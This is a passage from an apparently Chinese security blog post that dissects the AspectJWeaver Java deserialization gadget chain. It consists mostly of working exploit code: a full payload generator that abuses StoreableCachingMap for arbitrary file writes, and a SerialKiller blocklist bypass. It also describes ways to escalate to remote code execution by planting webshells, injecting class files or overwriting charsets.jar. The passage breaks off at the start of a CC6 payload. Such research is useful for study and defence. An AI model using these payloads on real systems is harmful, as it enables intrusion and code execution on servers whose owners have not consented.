class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjweaver<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:/&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AspectWrite.txt&quot;</span>;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);<br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(String.class, <span class="hljs-type">int</span>.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (Map) constructor.newInstance(path, <span class="hljs-number">2</span>);<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;content to write&quot;</span>.getBytes(StandardCharsets.UTF_8));<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, fileName);<br><br>        HashSet&lt;Object&gt; hs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;(<span class="hljs-number">1</span>);<br>        hs.add(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        setPut(hs, entry);<br>        ser(hs);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ser</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        objectOutputStream.writeObject(o);<br>        objectOutputStream.close();<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;E:/ser&quot;</span>);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br>        outputStream.write(baos.toByteArray());<br>        outputStream.close();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] fileBytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:/ser&quot;</span>));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(fileBytes));<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPut</span><span class="hljs-params">(HashSet&lt;Object&gt; hs, Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 获取HashSet中的HashMap对象</span><br>        Field field;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            field = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;backingMap&quot;</span>);<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> (HashMap) field.get(hs);<br><br>        <span class="hljs-comment">// 获取HashMap中的table对象</span><br>        Field field1;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field1 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            field1 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;elementData&quot;</span>);<br>        &#125;<br>        field1.setAccessible(<span class="hljs-literal">true</span>);<br>        Object[] array = (Object[]) field1.get(innerMap);<br><br>        <span class="hljs-comment">// 从table对象中获取索引0 或 1的对象，该对象为HashMap$Node类</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> array[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">null</span>) &#123;<br>            node = array[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        <span class="hljs-comment">// 从HashMap$Node类中获取key这个field，并修改为tiedMapEntry</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">keyField</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            keyField = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            keyField = Class.forName(<span class="hljs-string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125;<br>        keyField.setAccessible(<span class="hljs-literal">true</span>);<br>        keyField.set(node, o);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>GadGet</code>:</p><blockquote><p>HashSet#readObject</p><p>-&gt; HashMap#put(tiedMapEntry, new Object())</p><p>-&gt; HashMap#hash(tiedMapEntry)</p><p>-&gt; TiedMapEntry#hashCode</p><p>-&gt; TiedMapEntry#getValue</p><p>-&gt; LazyMap#get</p><p>-&gt; SimpleCache$StorableCachingMap#put</p><p>-&gt; SimpleCache$StorableCachingMap#writeToPath</p><p>-&gt; FileOutputStream#write()</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>顾名思义的角度，推测<code>StoreableCachingMap&quot;</code>可能是一个对对象进行存储和缓存的映射结构的名称。</p><p>它可能实现了一种将对象存储在内部数据结构中，并使用某种策略（例如时间戳、最近最少使用等）进行缓存管理的方式。</p><p>注意到<code>SimpleCache</code>类的内部类<code>StoreableCachingMap</code>是一个继承<code>HashMap</code>的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StoreableCachingMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HashMap</span> &#123;<br>        <span class="hljs-keyword">private</span> String folder;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CACHENAMEIDX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cache.idx&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">lastStored</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">DEF_STORING_TIMER</span> <span class="hljs-operator">=</span> <span class="hljs-number">60000</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> storingTimer;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Trace trace;<br></code></pre></td></tr></table></figure><p>其构造方法在创建对象时接收文件夹路径和存储计时器的值，并将它们保存到对象的状态中，同时调用了一个初始化方法来确保对象的正确设置。</p><p><code>StoreableCachingMap</code>是<code>HashMap</code>的子类，重写了<code>put</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-title function_">StoreableCachingMap</span><span class="hljs-params">(String folder, <span class="hljs-type">int</span> storingTimer)</span>&#123;<br>    <span class="hljs-built_in">this</span>.folder = folder;<br>    initTrace();<br>    <span class="hljs-built_in">this</span>.storingTimer = storingTimer;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">put</span><span class="hljs-params">(Object key, Object value)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] valueBytes = (<span class="hljs-type">byte</span>[]) value;<br><br>        <span class="hljs-keyword">if</span> (Arrays.equals(valueBytes, SAME_BYTES)) &#123;<br>            path = SAME_BYTES_STRING;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            path = writeToPath((String) key, valueBytes);<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.put(key, path);<br>        storeMap();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<span class="hljs-comment">//...</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">writeToPath</span><span class="hljs-params">(String key, <span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">fullPath</span> <span class="hljs-operator">=</span> folder + File.separator + key;<br>    <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(fullPath);<br>    fos.write(bytes);<br>    fos.flush();<br>    fos.close();<br>    <span class="hljs-keyword">return</span> fullPath;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码的功能是将键值对添加到映射中。根据 value 的不同情况，可能会将路径设置为SAME_BYTES_STRING 或使用 writeToPath 方法将键和值写入到某个路径中。然后，将键和路径添加到映射中，并将映射数据存储到持久化存储中。最后，返回添加结果。 </p><p>那个条件判断就是检查 valueBytes 是否与 SimpleCache.SAME_BYTES 相等。如果相等，说明 value 是一个特定的字节数组（SimpleCache.SAME_BYTES），则将 path 设置为SAME_BYTES_STRING。</p><p>SimpleCache.SAME_BYTES为下面的这个值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] SAME_BYTES = SAME_BYTES_STRING.getBytes();<br></code></pre></td></tr></table></figure><p>一通分析显然会进到else，跟进<code>writeToPath</code>，这段代码的功能是将字节数组写入到指定路径的文件中。它创建一个文件输出流对象，将字节数组<strong>写入到文件</strong>中，然后刷新输出流并关闭它。最后，返回写入的文件的完整路径。 </p><p>在return fullPath处设断，注意到写入以及取到的文件路径就是由this.folder，File.separator和key拼接而成的：</p><p><img src="/2024/08/09/AspectJWeaver/image-20240809194209784.png" alt="image-20240809194209784"></p><p><code>writeToPath</code>实现写文件，folder和key拼接组成文件全路径。传入<code>StoreableCachingMap#put</code>的key为文件名，value为写入的内容。</p><p>只要令传入的map为StoreableCachingMap即可触发StoreableCachingMap#put</p><p>而value的值也是我们通过ConstantTransformer可控的，如果key也可控，那么文件内容和路径都将由我们为所欲为。</p><p>但单纯的写文件危害不大，还得配合其他漏洞打。题目中遇到也只会成为一个小trick。</p><p>如何将写文件升级为RCE呢</p><h3 id="Jsp-WebShell"><a href="#Jsp-WebShell" class="headerlink" title="Jsp WebShell"></a>Jsp WebShell</h3><p>若目标应用支持解析JSP，可以直接写个Jsp WebShell。</p><h3 id="class-file-in-WEB-INF-classes"><a href="#class-file-in-WEB-INF-classes" class="headerlink" title="class file in WEB-INF&#x2F;classes"></a>class file in WEB-INF&#x2F;classes</h3><p>既然有反序列化入口，在<code>WEB-INF/classes</code>下写入一个恶意的字节码文件，在<code>readObject</code>或静态代码块中编写命令执行，然后再反序列化这个类。若有往<code>JAVA_HOME</code>写的权限，可以往<code>jre/classes</code>写入编译好的class。</p><h3 id="FatJar-under-SpringBoot"><a href="#FatJar-under-SpringBoot" class="headerlink" title="FatJar under SpringBoot"></a>FatJar under SpringBoot</h3><p>现很多应用都采用了SpringBoot打包成一个jar或者war包放到服务器上部署，我们无法往classpath写jsp或字节码文件了，那就考虑覆盖jdk的系统类。</p><p>由于jvm的类加载机制，并不会一次性把所有jdk中的jar包都进行加载。</p><p>往目标环境写入&#x2F;jre&#x2F;lib&#x2F;charsets.jar进行覆盖，然后在request header中加入特殊头部，此时由于给定了字符编码，会让jvm去加载charset.jar，从而触发恶意代码。</p><p>这种方法的缺点是目标$JAVA_HOME未知，需一个个尝试。</p><p>可以参考<a href="https://landgrey.me/blog/22/">LandGrey’s Blog</a></p><h2 id="Bypass-SerialKiller"><a href="#Bypass-SerialKiller" class="headerlink" title="Bypass SerialKiller"></a>Bypass SerialKiller</h2><p>利用链中的<code>ConstantTransformer</code>在<code>SerialKiller</code>中被ban了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://github.com/ikkisoft/SerialKiller<br></code></pre></td></tr></table></figure><p>需要找一个和<code>ConstantTransformer</code>效果等同的<code>Transformer</code></p><ul><li>（X）<code>StringValueTransformer</code></li></ul><p><code>transform</code>返回输入对象的字符串表示，会调用<code>toString()</code></p><p><img src="/2024/08/09/AspectJWeaver/image-20240809193140265.png" alt="image-20240809193140265"></p><p>但后面写文件时会把value强转为<code>byte[]</code>，而<code>String</code>强转不了<code>byte[]</code>，所以不能直接成功。</p><ul><li>（√）<code>FactoryTransformer</code>+<code>ConstantFactory</code></li></ul><p><img src="/2024/08/09/AspectJWeaver/image-20240809193242920.png" alt="image-20240809193242920"></p><p><img src="/2024/08/09/AspectJWeaver/image-20240809193258234.png" alt="image-20240809193258234"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> FactoryTransformer.getInstance(ConstantFactory.getInstance(<span class="hljs-string">&quot;666&quot;</span>.getBytes(StandardCharsets.UTF_8)));<br></code></pre></td></tr></table></figure><h2 id="Forward-Deser"><a href="#Forward-Deser" class="headerlink" title="Forward Deser"></a>Forward Deser</h2><p>利用<code>AspectJWeaver</code>任意文件写后，发现同目录下出现了一个<code>cache.idx</code>文件</p><p><code>StorableCachingMap#put</code>中调用完<code>writeToPath</code>后紧接着调用了<code>storeMap</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">storeMap</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>    <span class="hljs-keyword">if</span> ((now - lastStored ) &lt; storingTimer)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(folder + File.separator + CACHENAMEIDX);;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file));<br>        <span class="hljs-comment">// Deserialize the object</span><br>        out.writeObject(<span class="hljs-built_in">this</span>);<br>        out.close();<br>        lastStored = now;<br>    &#125; <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>获取当前系统时间，若和上次存储时间的时间差大于<code>storingTimer</code>，会创建一个文件<code>cache.idx</code>，并将<code>this</code>序列化写入。</p><p>有序列化的地方必然有反序列化，<code>StorableCachingMap#init</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> StoreableCachingMap <span class="hljs-title function_">init</span><span class="hljs-params">(String folder)</span> &#123;<br>    <span class="hljs-keyword">return</span> init(folder,DEF_STORING_TIMER);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> StoreableCachingMap <span class="hljs-title function_">init</span><span class="hljs-params">(String folder, <span class="hljs-type">int</span> storingTimer)</span> &#123;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(folder + File.separator + CACHENAMEIDX);<br>    <span class="hljs-keyword">if</span> (file.exists()) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file));<br>            <span class="hljs-comment">// Deserialize the object</span><br>            <span class="hljs-type">StoreableCachingMap</span> <span class="hljs-variable">sm</span> <span class="hljs-operator">=</span> (StoreableCachingMap) in.readObject();<br>            sm.initTrace();<br>            in.close();<br>            <span class="hljs-keyword">return</span> sm;<br>        &#125; <span class="hljs-comment">// ...</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StoreableCachingMap</span>(folder,storingTimer);<br>&#125;<br></code></pre></td></tr></table></figure><p>读取了<code>cache.idx</code>并进行反序列化。接着看哪里调用了<code>StoreableCachingMap#init</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-title function_">SimpleCache</span><span class="hljs-params">(String folder, <span class="hljs-type">boolean</span> enabled)</span> &#123;<br>    <span class="hljs-built_in">this</span>.enabled = enabled;<br><br>    cacheMap = Collections.synchronizedMap(StoreableCachingMap.init(folder));<br><br>    <span class="hljs-keyword">if</span> (enabled) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">generatedCachePath</span> <span class="hljs-operator">=</span> folder + File.separator + GENERATED_CACHE_SUBFOLDER;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span> (generatedCachePath);<br>        <span class="hljs-keyword">if</span> (!f.exists())&#123;<br>            f.mkdir();<br>        &#125;<br>        generatedCache = Collections.synchronizedMap(StoreableCachingMap.init(generatedCachePath,<span class="hljs-number">0</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>SimpleCache</code>的构造方法中调用<code>StoreableCachingMap#init</code>也很好理解。</p><p>顾名思义这个类是一个缓存类，<code>cacheMap</code>成员即其内部类<code>StoreableCachingMap</code>，充当了一个内存层面的键值对缓存，当然它支持持久化存储，也就是每次写入缓存（<code>StoreableCachingMap#put</code>）时，判断和上次存储时间的时间差是否超过<code>storingTimer</code>存储计时器，超过则进行持久化操作，存储格式是序列化数据，存储文件为<code>cache.idx</code>。</p><p>下次需要恢复到内存的时候，只需重新构造一个<code>SimpleCache</code>对象即可，它会调用<code>StoreableCachingMap#init</code>对持久化文件进行反序列化，得到原来的<code>cacheMap</code>。</p><p>思路到这里就很明显了，先用<code>AspectJWeaver</code>往<code>cache.idx</code>写入恶意序列化数据，再通过CC链触发构造函数。</p><p>为了防止写入文件后，<code>storeMap</code>又马上重写了我们的<code>cache.idx</code>，设置<code>storingTimer</code>为稍微大一点的值。</p><p>很可惜，不管是<code>InstantiateTransformer</code>还是<code>InstantiateFactory</code>，都要求目标类的构造方法需要是<code>public</code></p><p>应该能配合其他漏洞打，比如<code>SnakeYaml</code></p><p>贴一个写CC6序列化数据的payload，接下来就是调用<code>SimpleCache</code>构造器的问题了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span 